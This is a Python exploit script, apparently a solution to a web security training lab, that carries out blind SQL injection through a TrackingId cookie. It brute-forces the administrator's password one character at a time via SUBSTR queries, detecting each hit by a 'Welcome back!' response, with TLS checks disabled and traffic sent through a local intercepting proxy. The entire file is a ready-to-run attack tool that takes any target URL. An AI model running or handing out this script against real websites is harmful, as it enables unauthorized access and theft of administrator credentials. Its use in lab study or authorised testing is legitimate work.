import urllib3
import requests
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def exploit_blind_sqli(url):

    alphanumeric_list = ['0','1','2','3','4','5','6','7','8','9',
                        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
                        'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
                        'u', 'v', 'w', 'x', 'y', 'z']
    admin_password = "" 
    
    ## Assuming the admin passowrd is no longer than 30 chars
    for i in range(1,30):
        
        counter = 0
        for char in alphanumeric_list:
            counter+=1
            payload = "'+AND+SUBSTR((SELECT password FROM users WHERE username='administrator'),%i,1)+LIKE+'%s" %(i, char)


            # Replace trackingId with the new value 
            cookies = {
                "TrackingId": "n0sKImz7PUYG2jTw%s"%payload
            }

            req = requests.get(url,verify = False, proxies=proxies, cookies=cookies)
            res = req.text
            if "Welcome back!" in res:
                admin_password += char
                counter = 0
                break
        if counter == len(alphanumeric_list):
            print("[+] Lenght of admin passowrd is %s" %(i-1)) # i - 1 because the loop goes through one extra iteration before breaking which is not part of string lenght
            break # Because we reached the end of the password string 

    return admin_password 

if __name__=='__main__':
    try:
        url = sys.argv[1]
    except:
        print("[-] Usage %s <url>" % sys.argv[0])
        print("[-] Example %s www.example.com" %sys.argv[0])
    admin_password = exploit_blind_sqli(url)
    if admin_password:
        print("[+] The admin password is: %s" %admin_password)
    else:
        print("[+] Attack failed..")

